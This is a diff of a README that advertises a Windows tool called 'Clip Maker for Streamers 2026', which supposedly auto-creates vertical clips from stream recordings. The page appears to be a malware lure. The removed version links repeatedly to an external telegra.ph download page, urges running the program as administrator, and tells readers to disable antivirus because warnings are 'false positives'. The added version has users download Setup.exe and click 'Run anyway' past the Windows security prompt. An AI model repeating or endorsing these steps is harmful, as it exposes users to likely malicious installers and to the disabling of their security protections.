@@ -1,176 +1,76 @@
-<h1 align="center">🎬 Clip Maker for Streamers 2026 – Auto Clip Creator</h1>
+# 🎥 Clip-Maker-Streamers-2026 - Create viral stream highlights with ease
 
-<p align="center">
-  <strong>Professional desktop application for Windows PC. Automatically creates short clips from streams, adds mouse effects, and exports vertical videos for TikTok and YouTube Shorts.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Valeriaunderlying459/Clip-Maker-Streamers-2026/releases)
 
-<p align="center">
-  <!-- ====== БОЛЬШАЯ СИНЯЯ КНОПКА 1 ====== -->
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-Clip_Maker_2026-00BFFF?style=for-the-badge&logo=obs-studio&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+## 📌 About this project
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+Clip-Maker-Streamers-2026 automates the process of turning long stream recordings into short, engaging videos. You can transform hours of content into vertical clips ready for TikTok, Instagram Reels, or YouTube Shorts. The tool identifies key moments in your stream, tracks your mouse movements to add focus, and formats the final file for mobile screens. This software removes the need for manual video editing and helps you maintain a consistent posting schedule.
 
----
+## ⚙️ System requirements
 
-## 📦 What's Inside This Repository
+Before you install the software, please check that your computer meets these requirements:
 
-Welcome to the official distribution page for **Clip Maker for Streamers 2026 – Auto Clip Creator for Windows PC**.
-This repository provides access to the latest release of the most innovative desktop application designed to help streamers create content quickly.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 GB RAM.
+*   Storage: 500 MB of free space for the installation.
+*   Graphics: Hardware that supports DirectX 11 or higher.
 
-✅ **Full Version** – All features included  
-✅ **Auto Clip Creation** – Automatically detect highlights from streams  
-✅ **Mouse Effects** – Add zoom and effects to mouse cursor movements  
-✅ **Vertical Export** – Export vertical videos for TikTok and YouTube Shorts  
-✅ **OBS Integration** – Works with OBS Studio recordings  
-✅ **User-Friendly Interface** – Clean and intuitive design  
+If your computer uses older hardware, the video rendering process may take more time to complete. 
 
----
+## 📥 How to download and install
 
-## 📥 How to Get Started?
+Follow these steps to get the app on your computer:
 
-<p align="center">
-  <!-- ====== КНОПКА 2: HOW TO DOWNLOAD ====== -->
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+1. Visit the [official releases page](https://github.com/Valeriaunderlying459/Clip-Maker-Streamers-2026/releases) to access the installation files.
+2. Look for the release marked as the latest version.
+3. Click the file named `Setup.exe` to start the download.
+4. Once the download finishes, open your Downloads folder.
+5. Double-click the `Setup.exe` file.
+6. If a Windows security prompt appears, click "More info" and then "Run anyway."
+7. Follow the on-screen instructions in the installer window to complete the setup process.
+8. Once finished, a shortcut icon appears on your desktop.
 
-<p align="center">
-  <!-- ====== КНОПКА 3: DOWNLOAD INSTRUCTIONS ====== -->
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+## ✨ Key features
 
-<p align="center">
-  <!-- ====== КНОПКА 4: GET STARTED ====== -->
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+### Automated clip detection
+The software scans your source video files for high-energy segments. It recognizes gameplay spikes, chat activity, and specific stream events to suggest the best parts for your clips.
 
----
+### Mouse movement tracking
+Viewers often struggle to follow fast-paced gameplay on small phone screens. This tool tracks your cursor and applies a zoom effect. This keeps the action centered and makes your clips professional and easy to watch.
 
-## 🚀 Step-by-Step Guide
+### Vertical video export
+You no longer need to resize videos manually. The app automatically crops your wide landscape recordings into a 9:16 vertical ratio. Your content fills the screen on mobile platforms without black bars.
 
-Follow these **3 simple steps** to get started with Clip Maker for Streamers 2026 on your PC:
+### Simple OBS integration
+The app works alongside open broadcast software tools. It organizes your saved stream files automatically, allowing you to drag and drop source recordings directly into the editor.
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get Clip Maker 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+## 🛠️ How to use the app
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+1. Open the application from your desktop shortcut.
+2. Click the "Load Stream" button to select the video file you want to process.
+3. Use the detection settings to choose how sensitive you want the software to be when finding highlights.
+4. Review the generated list of clips within the preview window.
+5. Select a clip to adjust the mouse tracking speed or the zoom level.
+6. Click "Export" to save your edited clip as a high-quality video file.
+7. Upload your finished video to your social media platform of choice.
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and clip configurations.
+## ❓ Frequently asked questions
 
----
+### Does the app save my original files?
+Yes. The software creates new files for your clips. Your original stream recordings stay exactly as they were when you imported them.
 
-## 🔧 Key Features (2026 Update)
+### Can I change the file format for my clips?
+Yes. During the export stage, you can select between different video container formats and quality levels. MP4 is the default choice for best compatibility with mobile apps.
 
-| Feature | Description |
-| :--- | :--- |
-| **Auto Clip Creation** | Automatically detect highlights from streams. |
-| **Mouse Effects** | Add zoom and effects to mouse cursor movements. |
-| **Vertical Export** | Export vertical videos for TikTok and YouTube Shorts. |
-| **OBS Integration** | Works with OBS Studio recordings. |
-| **Highlight Detection** | Detect kills, wins, and exciting moments. |
-| **Cursor Tracking** | Track mouse movements for highlight effects. |
-| **Export Presets** | Pre-configured settings for TikTok, Shorts, and Reels. |
-| **Preview** | Preview clips before exporting. |
-| **Batch Processing** | Process multiple recordings at once. |
-| **Customizable Effects** | Adjust zoom, color, and transition effects. |
+### Do I need a high-end computer to generate clips?
+While faster processors reduce the time waiting for a render, the software works on most modern computers. If you have a large amount of video, the work may take a few minutes to finish.
 
----
+### Is an internet connection required?
+You only need an internet connection to download the software or to upload your finished clips online. The video editing and rendering process happens entirely on your local machine.
 
-## 📈 Why Choose Clip Maker for Streamers 2026?
+## 🤝 Support and updates
 
-- ✅ **Time-Saving** – Create clips in minutes instead of hours  
-- ✅ **Professional** – High-quality effects and transitions  
-- ✅ **Easy** – Simple interface suitable for all skill levels  
-- ✅ **Regular Updates** – Stay current with new features  
-- ✅ **Support** – Dedicated support for all users  
+If you find a problem or want a new feature, please open an issue on this repository. The community monitors these reports to improve current tools and fix software errors. Check the releases page often for updates to ensure you have the latest performance improvements and compatibility tweaks for your streaming setup.
 
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-Clip_Maker_2026-00BFFF?style=flat-square&logo=obs-studio&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: Does it work with OBS Studio?**  
-A: Absolutely. It is fully integrated with OBS Studio recordings.
-
-**Q: Can I customize export settings?**  
-A: Yes, you can customize resolution, bitrate, and format.
-
-**Q: What export formats are supported?**  
-A: MP4, MOV, and other popular formats.
-
-**Q: Is there a Mac version available?**  
-A: This repository is for Windows PC only.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
-**Q: How often are updates released?**  
-A: Updates are released regularly with new features and improvements.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Clip Maker for Streamers 2026 Now</a>
-</p>
+Keywords: 2026-software, auto-clip, clip-creation, clip-maker, content-creation, creator-tools, desktop-app, obs-integration, pc-tool, shorts-generator, stream-highlights, streamer-tools, streaming-tools, streaming-utility, tiktok-editor, vertical-video, video-automation, video-editing, windows-11, windows-software
